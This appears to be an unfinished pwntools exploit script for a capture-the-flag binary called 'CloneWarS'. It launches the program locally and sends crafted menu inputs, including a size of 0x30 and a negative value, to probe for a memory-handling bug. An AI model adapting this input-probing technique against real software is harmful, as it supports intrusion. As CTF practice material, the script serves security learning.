from pwn import *
  
elf = ELF('./CloneWarS')
context.arch = 'amd64'

file = './CloneWarS'
r = process(file)
print(r.pid)



print(r.recvline())

def pstarships(size, kind, capacity):
    r.sendlineafter('Your choice: ', '3')
    r.sendlineafter('Master, the amount of starships: ', str(size))
    r.sendlineafter('What kind of starships?: ', kind)
    r.sendlineafter('Capactiy of troopers in the starships: ', str(capacity))

def r2d2(n):
    r.sendlineafter('Your choice: ', '2')
    r.sendlineafter('R2? ', '2')

pstarships(0x30,'A', 0x30)
r2d2(-1)



@atexception.register
def handler():
    log.error(r.recv())
with context.local(log_level = 'error'):
    atexception.register(handler)
